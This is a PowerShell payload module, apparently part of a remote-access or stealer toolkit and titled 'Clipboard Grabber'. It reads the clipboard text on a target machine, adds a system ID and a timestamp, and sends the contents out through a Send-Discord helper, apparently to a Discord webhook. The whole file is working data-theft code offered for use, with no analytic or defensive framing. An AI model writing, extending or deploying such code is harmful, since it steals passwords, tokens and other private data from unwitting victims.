# ============================================================
# Clipboard Grabber - Modular Remote Payload
# ============================================================
# Extracts current clipboard contents
# ============================================================

$sysid = Get-SystemID

try {
    Add-Type -AssemblyName System.Windows.Forms
    
    $clip = [System.Windows.Forms.Clipboard]::GetText()
    
    if ($clip) {
        # Truncate if too long
        if ($clip.Length -gt 1800) {
            $clip = $clip.Substring(0, 1800) + "`n... (truncated)"
        }
        
        $output = "📋 **Clipboard from $sysid**`n"
        $output += "📅 " + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + "`n"
        $output += "=" * 40 + "`n"
        $output += "``````$clip``````"
        
        Send-Discord $output
    } else {
        Send-Discord "📋 Clipboard is empty on $sysid"
    }
} catch {
    Send-Discord "❌ Clipboard access failed on $sysid"
}

